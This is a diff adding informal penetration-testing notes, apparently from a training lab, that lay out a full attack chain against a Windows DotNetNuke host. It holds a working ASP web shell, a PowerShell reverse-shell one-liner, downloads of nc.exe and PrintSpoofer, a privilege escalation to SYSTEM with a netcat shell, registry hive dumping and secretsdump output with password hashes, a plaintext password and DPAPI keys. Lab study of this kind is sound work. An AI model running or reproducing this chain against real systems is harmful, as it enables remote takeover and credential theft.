@@ -5,6 +5,102 @@ Stoppign here on 02/24 jsut copying anythign down that maybe needed for tomrorow
 looks like were gonna need to copy printspoofer over again and run all the steps from yesterday again so ill jsut copy and paste from yesterdayss lesson: 
 
 
+1) clear all old stuff. 
+2) ssh -D 9050 root@10.129.248.159 -i rootkey
+3) in new terminal -> proxychains firefox 172.16.8.20 -> wait for it to open 
+4) go to settings -> sql console -> type: 
+EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
+5) hti run script -> itll come back with nothing, which is fine. delete all that then confirm with this 
+6) xpcmdshell 'whoami' 
+7) whitelist the extensions asp,aspx,exe,SAVE by editing "Allowable File Extensions": -> securityi -> more -> more security -> whitelist extensions
+8) on KALI nano ASPshell then copy and paste below: 
+
+<%
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject("WScript.Shell")
+    Set objCmdExec = objshell.exec(thecommand)
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
+%>
+
+
+<HTML>
+<BODY>
+<FORM action="" method="GET">
+<input type="text" name="cmd" size=45 value="<%= szCMD %>">
+<input type="submit" value="Run">
+</FORM>
+<PRE>
+<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+<%Response.Write(Request.ServerVariables("server_name"))%>
+<p>
+<b>The server's port:</b>
+<%Response.Write(Request.ServerVariables("server_port"))%>
+</p>
+<p>
+<b>The server's software:</b>
+<%Response.Write(Request.ServerVariables("server_software"))%>
+</p>
+<p>
+<b>The server's software:</b>
+<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
+<% szCMD = request("cmd")
+thisDir = getCommandOutput("cmd /c" & szCMD)
+Response.Write(thisDir)%>
+</p>
+<br>
+</BODY>
+</HTML> 
+
+9) upload that to the /admin/file-management -> once uplaoded click on it and itll take you to shell 
+10) OPEN ON NEW REGULAR ROOT SSH -> nc nlvp 9999
+11) on web shell use this PS oneliner to initate rev shell -> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+12) catch it on root shh 
+13)  ON KALI MACHINE RUN THESE TWO COMMANDS FOR NETCAT AND PRINTSPOOFER  
+
+wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+14) upload them to /admin/file-management just like we did with ASPshell 
+15) a NEW NEW regular root ssh shell adn run nc -nlvp 4444 -> this will catch printspoofer shell 
+16) on the shell we caught from ASPshell run this command -> c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 4444 -e cmd" 
+17) we now have nt authority \ system on printspooofer shell aka 4444
+18) on 4444 shell: 
+cd c:\dotnetnuke\portals\0\
+reg save HKLM\SYSTEM SYSTEM.SAVE
+reg save HKLM\SECURITY SECURITY.SAVE
+reg save HKLM\SAM SAM.SAVE
+19) save from /admin/file-management ** must do one by one for whatever reason. 
+20) ON KALI MACHINE: 
+secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE 
+
+
+Output: 
+Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:021e473e87d15de11d5e93c5a7195d2fb726f3eab764bbb6fa497751e7c31375bda5e0f6eb5324530767ed28f65eccfdfb1c64fc380cf19739691a61baec4e7dfc82e6d68bd9807e7d1b9b03c88f99d3094654d5fb3aacc2a25b5af688b7de1def50826409556dbdde4b866853729c7cdec6c847fc4daa5c11ac353b40a65860e8f501ef4a8df6a1de7f5851899bd04b14e4fd9cc6688e870c90940b041c1ce8aee9130d903a877d6f23d881ff76d75a5dd22fdffc7b23c7e48f62cd46373e7feb0464de60737a9874410b8e10784caddb0aaff67b3b1c4fc71df9c09ec2bc23bf6b9948854e4c713f4de119deea14c3
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:47377299aecaba8fa720b9d9b79a022d
+[*] DefaultPassword 
+(Unknown User):Gr8hambino!
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
+dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
+
 
 
 
